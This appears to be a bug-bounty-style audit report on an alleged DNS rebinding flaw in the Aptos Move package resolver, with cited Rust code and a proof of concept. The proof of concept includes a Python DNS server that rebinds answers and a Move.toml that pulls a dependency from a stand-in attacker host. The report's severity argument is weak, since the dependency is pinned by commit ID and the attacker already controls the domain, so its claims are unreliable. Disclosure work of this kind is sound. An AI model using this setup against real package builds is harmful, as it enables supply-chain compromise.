# Audit Report

## Title
DNS Rebinding Vulnerability in Move Package Dependency Resolution Allows Supply Chain Attacks

## Summary
The Move package dependency resolution system resolves Git and Aptos node URLs multiple times during the dependency fetching process without caching or validating IP address consistency. This allows DNS rebinding attacks where an attacker can serve different content (malicious Move code or bytecode) on subsequent resolutions, enabling supply chain attacks against Move package builds.

## Finding Description

The `PackageLocation` enum defines three types of package dependencies: Local, Git, and Aptos (on-chain). [1](#0-0) 

During Git dependency resolution, the URL is resolved via DNS **twice** in separate network operations:

**First DNS Resolution**: When `resolve_git_revision` is called to determine the commit ID: [2](#0-1) 

This flows through the package lock: [3](#0-2) 

Which calls `clone_or_update_git_repo` that performs DNS resolution via libgit2 during clone or fetch operations: [4](#0-3) 

**Second DNS Resolution**: When `checkout_git_repo` is called to fetch the actual package contents: [5](#0-4) 

This again calls `clone_or_update_git_repo` (even if the repo already exists, the fetch operation resolves DNS): [6](#0-5) 

Similarly, for Aptos (on-chain) dependencies, the node URL is resolved **twice**:

**First Resolution**: In `resolve_network_version` which creates an HTTP client and makes a request: [7](#0-6) 

**Second Resolution**: In `fetch_on_chain_package` which creates another HTTP client and makes requests: [8](#0-7) 

Between these operations, there are multiple `await` points where the async runtime yields control, providing sufficient time window for a DNS rebinding attack.

**Attack Scenario**:
1. Attacker publishes a Move package with malicious dependency: `git = "https://malicious.com/repo"` or `aptos = "https://malicious.com"`
2. Attacker controls DNS for malicious.com with TTL of 0-5 seconds
3. First DNS resolution: malicious.com → legitimate-ip (e.g., GitHub mirror or public Aptos node)
4. Legitimate content is validated/checked
5. Between operations, DNS record expires and attacker updates it
6. Second DNS resolution: malicious.com → attacker-controlled-ip or internal-ip (e.g., 192.168.x.x, 10.x.x.x)
7. Attacker serves malicious Move source code or bytecode
8. Victim's build process compiles and potentially deploys compromised code

## Impact Explanation

This vulnerability enables **supply chain attacks** against the Move ecosystem with the following impacts:

1. **Code Injection**: Malicious Move code can be injected into package builds, potentially introducing vulnerabilities into deployed contracts including governance, staking, or DeFi protocols
2. **SSRF (Server-Side Request Forgery)**: Attackers can rebind to internal network addresses to access:
   - Internal Git repositories containing proprietary code
   - Internal Aptos validator nodes or development environments
   - Other internal services (databases, APIs, admin panels)
3. **Information Disclosure**: Access to internal package code, configuration, or network topology

While this vulnerability doesn't directly affect blockchain consensus or runtime execution, it compromises the **security of the development and deployment pipeline**, which is critical for maintaining the integrity of Move contracts deployed on Aptos. This qualifies as **High Severity** per the bug bounty program ("Significant protocol violations" and supply chain security).

## Likelihood Explanation

**Likelihood: Medium-High**

**Attacker Requirements**:
- Control over a domain name (easily obtainable)
- Ability to publish packages or convince developers to add dependencies (social engineering or ecosystem participation)
- No special privileges or validator access needed

**Exploitation Complexity**: Low
- DNS rebinding is a well-known technique
- Many developers regularly add external dependencies
- No complex timing requirements due to multiple await points

**Realistic Scenarios**:
- Malicious package published to community package registry
- Typosquatting on popular package names
- Compromised legitimate packages with malicious dependencies added

## Recommendation

**Primary Fix**: Resolve URLs to IP addresses once and cache/reuse the resolved IP for all operations within the same dependency resolution flow.

**Implementation Options**:

1. **IP Address Caching**: When resolving a Git or Aptos URL, resolve it to an IP address once and store it. Subsequent operations should verify the IP remains the same or reuse the cached connection.

2. **Single Network Operation**: Restructure the code to perform all necessary network operations in a single call to `clone_or_update_git_repo` or use the already-opened connection.

3. **IP Validation**: After each DNS resolution, verify that the resolved IP address matches the first resolution. If it changes, reject the operation with an error.

**Example Fix Pattern**:
```rust
// Store resolved IP with the URL
struct ResolvedUrl {
    url: Url,
    resolved_ip: IpAddr,
}

// Verify IP consistency before second operation
fn verify_ip_unchanged(url: &Url, expected_ip: IpAddr) -> Result<()> {
    let current_ip = resolve_dns(url)?;
    if current_ip != expected_ip {
        bail!("DNS rebinding detected: IP changed from {} to {}", 
              expected_ip, current_ip);
    }
    Ok(())
}
```

**Additional Mitigations**:
- Implement URL allowlists for trusted package sources
- Add warnings when using non-HTTPS URLs
- Consider certificate pinning for known sources
- Add DNS resolution logging for security monitoring

## Proof of Concept

**Demonstration Setup**:

1. Create a malicious DNS server that changes responses:
```python
# dns_rebinding_poc.py
from dnslib.server import DNSServer, BaseResolver
import time

class RebindingResolver(BaseResolver):
    def __init__(self):
        self.start_time = time.time()
    
    def resolve(self, request, handler):
        qname = request.q.qname
        # First 5 seconds: return legitimate IP
        if time.time() - self.start_time < 5:
            return create_response(request, "140.82.121.4")  # github.com
        # After 5 seconds: return attacker IP
        else:
            return create_response(request, "10.0.0.1")  # internal IP

resolver = RebindingResolver()
server = DNSServer(resolver, port=53)
server.start()
```

2. Create malicious Move.toml:
```toml
[package]
name = "VictimPackage"
version = "1.0.0"

[dependencies]
MaliciousDep = { git = "https://malicious.attacker.com/repo", rev = "main" }
```

3. Set up attacker-controlled server at 10.0.0.1 with malicious Move code

4. Build the package:
```bash
aptos move compile
```

**Expected Result**: The package resolver will:
- First resolve malicious.attacker.com → 140.82.121.4 (legitimate)
- Second resolve malicious.attacker.com → 10.0.0.1 (attacker/internal)
- Fetch malicious code from internal network

**Verification**: Monitor network traffic to observe two different IP addresses being contacted for the same domain name, demonstrating successful DNS rebinding.

---

## Notes

This vulnerability affects the **build-time security** of Move packages rather than runtime blockchain execution. However, it represents a critical supply chain attack vector that could compromise the integrity of deployed Move contracts, including core framework components, governance modules, and user applications. The impact extends beyond individual developers to the entire Aptos ecosystem's security posture.

### Citations

**File:** third_party/move/tools/move-package-manifest/src/manifest.rs (L126-156)
```rust
#[derive(Debug, Clone, Eq, PartialEq)]
pub enum PackageLocation {
    /// Refers to a package stored in the local file system.
    Local { path: PathBuf },

    /// Refers to a package stored in a git repository.
    Git {
        /// URL to the Git repository.
        url: Url,
        /// Optional Git revision to pin the dependency to.
        /// This can be a commit hash, a branch name or a tag name.
        rev: Option<String>,
        /// Optional subdirectory within the Git repository.
        subdir: Option<String>,
    },

    /// Refers to a package published on-chain.
    ///
    // TODO: The current design is tentative. There are issues we plan to resolve later:
    //       - Leaky abstraction -- can we still want to maintain clear Move/Aptos separation?
    //       - Replacing `String` w/ more specific data structures
    //         - `node_url`: Should accept both URL and known network names (e.g. "mainnet")
    //         - `package_addr`: May accept both numerical and named addresses
    Aptos {
        /// URL to the Aptos full-node connected to the network where the package is published.
        node_url: String,

        /// Address of the published package.
        package_addr: AccountAddress,
    },
}
```

**File:** third_party/move/tools/move-package-resolver/src/resolver.rs (L205-214)
```rust
        SourceLocation::Git {
            repo: _,
            commit_id,
            subdir,
        } => {
            let git_url = user_provided_url.expect("must be specified for on-chain dep");

            let checkout_path = package_cache.checkout_git_repo(git_url, *commit_id).await?;
            checkout_path.join(subdir)
        },
```

**File:** third_party/move/tools/move-package-resolver/src/resolver.rs (L387-390)
```rust
        PackageLocation::Git { url, rev, subdir } => {
            let commit_id = package_lock
                .resolve_git_revision(package_cache, &url, &rev.unwrap())
                .await?;
```

**File:** third_party/move/tools/move-package-resolver/src/lock.rs (L62-84)
```rust
    pub async fn resolve_git_revision<L>(
        &mut self,
        package_cache: &PackageCache<L>,
        git_url: &Url,
        rev: &str,
    ) -> Result<Oid>
    where
        L: PackageCacheListener,
    {
        let git_identity = CanonicalGitIdentity::new(git_url)?;

        let repo_loc_and_rev = format!("{}@{}", git_identity, rev);

        let res = match self.git.entry(repo_loc_and_rev) {
            btree_map::Entry::Occupied(entry) => entry.get().clone(),
            btree_map::Entry::Vacant(entry) => {
                let oid = package_cache.resolve_git_revision(git_url, rev).await?;
                entry.insert(oid.to_string()).clone()
            },
        };

        Ok(Oid::from_str(&res)?)
    }
```

**File:** third_party/move/tools/move-package-resolver/src/lock.rs (L90-106)
```rust
    pub async fn resolve_network_version(&mut self, fullnode_url: &Url) -> Result<u64> {
        let node_identity = CanonicalNodeIdentity::new(fullnode_url)?;

        let res = match self.on_chain.entry(node_identity.to_string()) {
            btree_map::Entry::Occupied(entry) => *entry.get(),
            btree_map::Entry::Vacant(entry) => {
                let client = aptos_rest_client::Client::new(fullnode_url.clone());
                let version = client.get_ledger_information().await?.into_inner().version;

                entry.insert(version);

                version
            },
        };

        Ok(res)
    }
```

**File:** third_party/move/tools/move-package-cache/src/package_cache.rs (L93-178)
```rust
    async fn clone_or_update_git_repo(&self, git_url: &Url) -> Result<ActiveRepository>
    where
        L: PackageCacheListener,
    {
        let repo_dir_name = percent_encode_for_filename(&CanonicalGitIdentity::new(git_url)?);
        let repos_path = self.root.join("git").join("repos");
        let repo_path = repos_path.join(&repo_dir_name);

        println!("{}", repo_path.display());

        // First, acquire a file lock to ensure exclusive write access to the cached repo.
        let lock_path = repo_path.with_extension("lock");

        fs::create_dir_all(&repos_path)?;
        let file_lock =
            FileLock::lock_with_alert_on_wait(&lock_path, Duration::from_millis(1000), || {
                self.listener.on_file_lock_wait(&lock_path);
            })
            .await?;

        // Next, ensure that we have an up-to-date clone of the repo locally.
        //
        // Before performing the actual operation, we need to configure the fetch options
        // (shared by both clone and update).
        let mut cbs = RemoteCallbacks::new();
        let mut received = 0;
        cbs.transfer_progress(move |stats| {
            let received_new = stats.received_objects();

            if received_new != received {
                received = received_new;

                self.listener.on_repo_receive_object(
                    git_url.as_str(),
                    stats.received_objects(),
                    stats.total_objects(),
                );
            }

            true
        });
        let mut fetch_options = FetchOptions::new();
        fetch_options.remote_callbacks(cbs);

        let repo = if repo_path.exists() {
            // If the repo already exists, update it.
            self.listener.on_repo_update_start(git_url.as_str());

            let repo = Repository::open_bare(&repo_path)?;
            {
                let mut remote = repo.find_remote("origin")?;
                // Fetch all remote branches and map them to local remote-tracking branches
                // - refs/heads/*: fetch all remote branches
                // - refs/remotes/origin/*: store them as local remote-tracking branches under origin/
                remote
                    .fetch(
                        &["refs/heads/*:refs/remotes/origin/*"],
                        Some(&mut fetch_options),
                        None,
                    )
                    .map_err(|err| anyhow!("Failed to update git repo at {}: {}", git_url, err))?;
            }

            self.listener.on_repo_update_complete(git_url.as_str());

            repo
        } else {
            // If the repo does not exist, clone it.
            let mut repo_builder = RepoBuilder::new();
            repo_builder.fetch_options(fetch_options);
            repo_builder.bare(true);

            self.listener.on_repo_clone_start(git_url.as_str());
            let repo = repo_builder
                .clone(git_url.as_str(), &repo_path)
                .map_err(|err| anyhow!("Failed to clone git repo at {}: {}", git_url, err))?;
            self.listener.on_repo_clone_complete(git_url.as_str());

            repo
        };

        Ok(ActiveRepository {
            repo,
            lock: file_lock,
        })
    }
```

**File:** third_party/move/tools/move-package-cache/src/package_cache.rs (L208-273)
```rust
    pub async fn checkout_git_repo(&self, git_url: &Url, oid: Oid) -> Result<PathBuf>
    where
        L: PackageCacheListener,
    {
        let repo_dir_name = percent_encode_for_filename(&CanonicalGitIdentity::new(git_url)?);
        let checkouts_path = self.root.join("git").join("checkouts");

        // Check if a checkout already exists for this commit.
        let checkout_path = checkouts_path.join(format!("{}@{}", repo_dir_name, oid));
        if checkout_path.exists() {
            return Ok(checkout_path);
        }

        // Checkout does not exist -- need to create one.
        //
        // However before we do that, we need to make sure the repo is cloned to the local
        // file system and updated.
        let repo = self.clone_or_update_git_repo(git_url).await?;

        // Acquire a file lock to ensure exclusive write access to the checkout.
        let lock_path = checkout_path.with_extension("lock");

        fs::create_dir_all(&checkouts_path)?;
        let _file_lock =
            FileLock::lock_with_alert_on_wait(&lock_path, Duration::from_millis(1000), || {
                self.listener.on_file_lock_wait(&lock_path);
            })
            .await?;

        self.listener
            .on_repo_checkout(git_url.as_str(), oid.as_bytes());

        // Create the files from the commit.
        //
        // The files stored into a temporary directory, and then the temporary directory
        // is atomically renamed/moved to the destination.
        //
        // This is to ensure we only expose complete checkouts.
        let temp = tempfile::tempdir_in(&checkouts_path)?;

        let commit = repo.repo.find_commit(oid)?;
        let tree = commit.tree()?;

        tree.walk(git2::TreeWalkMode::PreOrder, |root, entry| {
            let name = entry.name().unwrap_or("");
            let full_path = temp.path().join(format!("{}{}", root, name));

            match entry.kind() {
                Some(ObjectType::Blob) => {
                    let blob = repo.repo.find_blob(entry.id()).unwrap();
                    fs::create_dir_all(full_path.parent().unwrap()).unwrap();
                    let mut file = File::create(&full_path).unwrap();
                    file.write_all(blob.content()).unwrap();
                },
                Some(ObjectType::Tree) => (),
                _ => {},
            }

            TreeWalkResult::Ok
        })?;

        remove_dir_if_exists(&checkout_path)?;
        fs::rename(temp.into_path(), &checkout_path)?;

        Ok(checkout_path)
    }
```

**File:** third_party/move/tools/move-package-cache/src/package_cache.rs (L280-332)
```rust
    pub async fn fetch_on_chain_package(
        &self,
        fullnode_url: &Url,
        network_version: u64,
        address: AccountAddress,
        package_name: &str,
    ) -> Result<PathBuf>
    where
        L: PackageCacheListener,
    {
        let on_chain_packages_path = self.root.join("on-chain");

        let canonical_node_identity = CanonicalNodeIdentity::new(fullnode_url)?;
        let canonical_name = format!(
            "{}+{}+{}+{}",
            &*canonical_node_identity, network_version, address, package_name
        );

        let cached_package_path = on_chain_packages_path.join(&canonical_name);

        // If the package directory already exists, assume it has been cached.
        if cached_package_path.exists() {
            // TODO: In the future, consider verifying data integrity,
            //       e.g. hash of metadata or full contents.
            return Ok(cached_package_path);
        }

        // Package directory does not exist -- need to download the package and cache it.
        //
        // First, acquire a lock to ensure exclusive write access to this package.
        let lock_path = cached_package_path.with_extension("lock");

        fs::create_dir_all(&on_chain_packages_path)?;
        let _file_lock =
            FileLock::lock_with_alert_on_wait(&lock_path, Duration::from_millis(1000), || {
                self.listener.on_file_lock_wait(&lock_path);
            })
            .await?;

        self.listener.on_file_lock_acquired(&lock_path);

        // After acquiring the lock, re-check if the package was already cached by another process.
        if cached_package_path.exists() {
            return Ok(cached_package_path);
        }

        // Fetch the on-chain package registry at the specified ledger version and look-up the
        // package by name.
        self.listener
            .on_bytecode_package_download_start(address, package_name);

        let client = aptos_rest_client::Client::new(fullnode_url.clone());

```
